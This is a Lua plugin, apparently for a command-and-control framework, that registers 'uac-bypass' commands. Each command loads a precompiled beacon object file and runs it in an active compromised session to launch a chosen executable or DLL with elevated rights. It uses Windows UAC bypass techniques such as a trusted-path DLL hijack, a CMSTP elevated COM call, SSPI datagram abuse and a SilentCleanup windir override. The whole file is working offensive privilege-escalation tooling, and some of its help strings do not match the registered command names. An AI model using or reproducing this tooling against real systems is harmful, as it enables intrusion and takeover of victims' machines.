-- to do
local uacbofbonanza = {}
uacbofbonanza.parent_command = "uac-bypass"

local function command_register(command_name, command_function, help_string, ttp)
    command(uacbofbonanza.parent_command .. ":" .. command_name, command_function, help_string, ttp)
end
local function bof_path(bof_name)
    return "UAC-BOF-Bonanza/" .. bof_name .. "/bin/" .. bof_name .. "BOF.o"
end

-- trustedpath
function uacbofbonanza.run_trustedpath(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("TrustedPathDLLHijack")
    local file_content = read(args[1])
    local content_len = string.len(file_content)
    local pack_args = bof_pack("iz",content_len ,file_content) -- string field contains invalid UTF-8
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("trustedpath", uacbofbonanza.run_trustedpath, "uac-bypass trustedpath <dll on your disk to execute]>", "")
-- end trustedpath

-- CmstpElevatedCOM
function uacbofbonanza.run_CmstpElevatedCOM(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("CmstpElevatedCOM")
    local pack_args = bof_pack("z",args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("elevatedcom", uacbofbonanza.run_CmstpElevatedCOM, "uac-bypass elevatedcom <Exe File on target host to execute>", "")
-- end CmstpElevatedCOM

-- sspi
function uacbofbonanza.SspiUacBypass(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("SspiUacBypass")
    local pack_args = bof_pack("z",args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("sspidatagram", uacbofbonanza.SspiUacBypass, "uac-bypass sspi <Exe File on target host to execute>", "")
-- end sspi

-- RegistryShellCommand
function uacbofbonanza.run_RegistryShellCommand(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("RegistryShellCommand")
    local pack_args = bof_pack("z",args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("RegistryShellCommand", uacbofbonanza.run_RegistryShellCommand, "uac-bypass registrycommand <Exe File on target host to execute>", "")
-- end RegistryShellCommand

-- SilentCleanupWinDir
function uacbofbonanza.run_SilentCleanupWinDir(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("SilentCleanupWinDir")
    local file_content = read(args[1])
    local content_len = string.len(file_content)
    local pack_args = bof_pack("iz",content_len ,file_content) -- string field contains invalid UTF-8
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("silentcleanup", uacbofbonanza.run_SilentCleanupWinDir, "uac-bypass silentcleanup <Exe File your disk to execute>", "")
-- end SilentCleanupWinDir

-- ColorDataProxy
function uacbofbonanza.run_ColorDataProxy(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("ColorDataProxy")
    local pack_args = bof_pack("z",args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("colordataproxy", uacbofbonanza.run_ColorDataProxy, "uac-bypass colordataproxy <Exe File on target host to execute>", "")
-- end ColorDataProxy

-- EditionUpgradeManager
function uacbofbonanza.run_EditionUpgradeManager(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("EditionUpgradeManager")
    local file_content = read(args[1])
    local content_len = string.len(file_content)
    local pack_args = bof_pack("iz",content_len ,file_content) -- string field contains invalid UTF-8
    return bof(session, script_resource(bof_file), pack_args, true)
end
command_register("editionupgrade", uacbofbonanza.run_EditionUpgradeManager, "uac-bypass editionupgrade <Exe File your disk to execute>", "")
-- end EditionUpgradeManager
